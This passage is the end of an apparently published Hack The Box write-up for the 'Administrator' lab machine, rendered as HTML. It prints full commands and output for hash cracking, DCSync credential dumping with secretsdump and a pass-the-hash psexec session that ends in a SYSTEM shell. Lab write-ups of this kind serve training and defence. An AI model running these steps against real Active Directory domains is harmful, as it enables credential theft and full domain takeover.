+</span></span></code></pre></div><p>Now let&rsquo;s try cracking this hash with Hashcat. I use the <code>-O</code> flag to enable optimized kernels, which work much faster but only for the passwords that are at most 31-characters long. Since most user passwords on HTB (and in the real world) do not exceed that limit, it&rsquo;s always worth trying to crack the hash with this option first.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">hashcat -a <span class="m">0</span> -m <span class="m">13100</span> ethan-spn-ticket-hash /usr/share/wordlists/rockyou.txt -O
+</span></span></code></pre></div><p>The password turns out to be <code>limpbizkit</code>.</p>
+<p>We can&rsquo;t log in to FTP as <code>ethan</code> and don&rsquo;t get any new permissions in SMB.
+Let&rsquo;s rerun BloodHound as <code>ethan</code> now and import the results into the GUI, just in case.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">sudo bloodhound-python -u <span class="s1">&#39;ethan&#39;</span> -p <span class="s1">&#39;limpbizkit&#39;</span> -ns 10.129.20.250 -d administrator.htb -c all --zip
+</span></span></code></pre></div><p>We can see that <code>ethan</code> has both GetChangesAll and GetChanges rights over the domain, which together grant us the ability to perform DCSync.
+<img loading="lazy" src="/img/administrator/8.png"></p>
+<p>By default, these rights are granted to Domain/Enterprise Admins and default domain admins only, but due to a misconfiguration, our user has these rights despite not being a member of either of those groups.
+<img loading="lazy" src="/img/administrator/9.png"></p>
+<p><img loading="lazy" src="/img/administrator/10.png"></p>
+<p><img loading="lazy" src="/img/administrator/11.png"></p>
+<p>Now all that&rsquo;s left for us to do to is to perform a DCSync attack and get the Administrator user hash for a complete domain takeover. Since <code>ethan</code> is not in the Remote Management Users group, it would be easiest for us to carry out the exploit from our attack machine using a tool like Impacket&rsquo;s secretsdump:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">impacket-secretsdump -outputfile secretsdump.txt -just-dc-ntlm -just-dc-user Administrator administrator/ethan@10.129.20.250
+</span></span><span class="line"><span class="cl">Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Password:
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Dumping Domain Credentials <span class="o">(</span>domain<span class="se">\u</span>id:rid:lmhash:nthash<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Using the DRSUAPI method to get NTDS.DIT secrets
+</span></span><span class="line"><span class="cl">Administrator:500:aad3b435b51404eeaad3b435b51404ee:3dc553ce4b9fd20bd016e098d2d2fd2e:::
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Cleaning up...
+</span></span></code></pre></div><p>Here, we get the NTLM hash from NTDS for the Administrator user only. Without the <code>-just-dc-ntlm</code> option, secretsdump would have also retrieved the Administrator&rsquo;s Kerberos keys from NTDS, but since we don&rsquo;t need them, I chose to include that option.</p>
+<p>Now perform the pass-the-hash attack with the Administrator&rsquo;s hash:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">impacket-psexec administrator.htb/administrator@dc.administrator.htb -hashes <span class="s1">&#39;aad3b435b51404eeaad3b435b51404ee:3dc553ce4b9fd20bd016e098d2d2fd2e&#39;</span>
+</span></span><span class="line"><span class="cl">Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Requesting shares on dc.administrator.htb.....
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Found writable share ADMIN$
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Uploading file HVJaXfHq.exe
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Opening SVCManager on dc.administrator.htb.....
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Creating service qMSZ on dc.administrator.htb.....
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Starting service qMSZ.....
+</span></span><span class="line"><span class="cl"><span class="o">[</span>!<span class="o">]</span> Press <span class="nb">help</span> <span class="k">for</span> extra shell commands
+</span></span><span class="line"><span class="cl">Microsoft Windows <span class="o">[</span>Version 10.0.20348.2762<span class="o">]</span>
+</span></span><span class="line"><span class="cl"><span class="o">(</span>c<span class="o">)</span> Microsoft Corporation. All rights reserved.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt; whoami
+</span></span><span class="line"><span class="cl">nt authority<span class="se">\s</span>ystem
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt; dir C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop
+</span></span><span class="line"><span class="cl"> Volume in drive C has no label.
+</span></span><span class="line"><span class="cl"> Volume Serial Number is 6131-DE70
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"> Directory of C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">11/01/2024  02:47 PM    &lt;DIR&gt;          .
+</span></span><span class="line"><span class="cl">10/22/2024  11:46 AM    &lt;DIR&gt;          ..
+</span></span><span class="line"><span class="cl">06/13/2026  07:21 AM                <span class="m">34</span> root.txt
+</span></span><span class="line"><span class="cl">               <span class="m">1</span> File<span class="o">(</span>s<span class="o">)</span>             <span class="m">34</span> bytes
+</span></span><span class="line"><span class="cl">               <span class="m">2</span> Dir<span class="o">(</span>s<span class="o">)</span>   8,488,067,072 bytes free
+</span></span></code></pre></div><p>We get the shell as <code>SYSTEM</code> as well as the root flag!</p>
+
+  </div>
+</article>
+
+    
+<footer class="footer">
+
+    
+
+    <div class="social-icons" >
+    <a href="https://www.linkedin.com/in/stepanzhuravlev/" target="_blank" rel="noopener noreferrer me"
+        title="LinkedIn">
+        
+
+<svg xmlns="http://www.w3.org/2000/svg" height="72" viewBox="0 0 74 74" width="72">
+    <g fill="none" fill-rule="evenodd">
+        <path d="M62,62 L51.315625,62 L51.315625,43.8021149 C51.315625,38.8127542 49.4197917,36.0245323 45.4707031,36.0245323 C41.1746094,36.0245323 38.9300781,38.9261103 38.9300781,43.8021149 L38.9300781,62 L28.6333333,62 L28.6333333,27.3333333 L38.9300781,27.3333333 L38.9300781,32.0029283 C38.9300781,32.0029283 42.0260417,26.2742151 49.3825521,26.2742151 C56.7356771,26.2742151 62,30.7644705 62,40.051212 L62,62 Z M16.349349,22.7940133 C12.8420573,22.7940133 10,19.9296567 10,16.3970067 C10,12.8643566 12.8420573,10 16.349349,10 C19.8566406,10 22.6970052,12.8643566 22.6970052,16.3970067 C22.6970052,19.9296567 19.8566406,22.7940133 16.349349,22.7940133 Z M11.0325521,62 L21.769401,62 L21.769401,27.3333333 L11.0325521,27.3333333 L11.0325521,62 Z" fill="currentColor"/>
+    </g>
+</svg>
+
+
+
+
+        &nbsp&nbsp;LinkedIn
+    </a>
+    <a href="https://github.com/IntelliJr/" target="_blank" rel="noopener noreferrer me"
+        title="GitHub">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+    stroke-linecap="round" stroke-linejoin="round">
+    <path
+        d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22">
+    </path>
+</svg>
+        &nbsp&nbsp;GitHub
+    </a>
+    <a href="https://app.hackthebox.com/public/users/1428044" target="_blank" rel="noopener noreferrer me"
+        title="Hack the Box">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" preserveAspectRatio="xMidYMid meet" fill="currentColor"
+    stroke="none">
+    <g>
+        <path
+            d="M11.9959.0008a1.1187 1.1187 0 00-.057.002.8993.8993 0 00-.2358.0498.9067.9067 0 00-.1652.079L1.9357 5.675a.889.889 0 00-.4444.7699c0 .006.0004.0128.0006.0192-.0002.007 0 .014 0 .0212V17.556a.889.889 0 00.469.7837l9.5983 5.5416c.018.0102.036.0197.054.0287v.002a.8568.8568 0 00.083.0348c0 .001.01.003.012.004.028.01.056.0177.085.0245.01.001.011.003.016.004.028.006.057.0112.086.0146 0 .0005.01.0009.014.001.03.003.061.005.091.005s.061-.002.091-.005c0-.0005.01-.0009.014-.001a.6831.6831 0 00.086-.0146c.01-.001.011-.002.016-.004a.9404.9404 0 00.085-.0245c0-.001.01-.003.012-.004a.8818.8818 0 00.083-.0347v-.002a1.086 1.086 0 00.054-.0287l9.5986-5.5416a.889.889 0 00.4689-.7837V6.4786c0-.009-.0006-.0172-.0008-.0258h.0003v-.008a.8886.8886 0 00-.3117-.6755c-.01-.008-.019-.0162-.029-.0241 0-.002-.01-.005-.01-.007a.8988.8988 0 00-.1074-.0705L12.4533.1267a.8872.8872 0 00-.4646-.1266zm.01 2.2523c.072 0 .1443.0187.209.056l6.5366 3.774c.2789.161.2789.5633 0 .7243l-6.5367 3.774a.4182.4182 0 01-.4182 0L5.26 6.8074c-.2788-.1609-.2789-.5633 0-.7243l6.5368-3.774a.4193.4193 0 01.209-.056zm-8.0801 6.458a.4145.4145 0 01.215.0565l6.524 3.7666a.417.417 0 01.2086.3612v7.5326c0 .3212-.3477.522-.626.3613l-6.5237-3.7666a.4172.4172 0 01-.2086-.3613V9.1288c0-.2408.1955-.414.4107-.4177zm16.1599 0c.215.004.4107.1768.4107.4177v7.5325c0 .149-.08.2868-.2087.3614l-6.5239 3.7666c-.278.1606-.6258-.0401-.6258-.3614v-7.5325c0-.149.08-.2867.2086-.3613l6.5238-3.7666a.415.415 0 01.2152-.0565z">
+        </path>
+    </g>
+</svg>
+        &nbsp&nbsp;Hack The Box
+    </a>
+</div>
+
+</footer>
+
+
+
+<script>
+    let menu = document.getElementById('menu');
+    if (menu) {
+        
+        const scrollPosition = localStorage.getItem("menu-scroll-position");
+        if (scrollPosition) {
+            menu.scrollLeft = parseInt(scrollPosition, 10);
+        }
+        
+        
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+
+
+
+</body>
+
+</html>
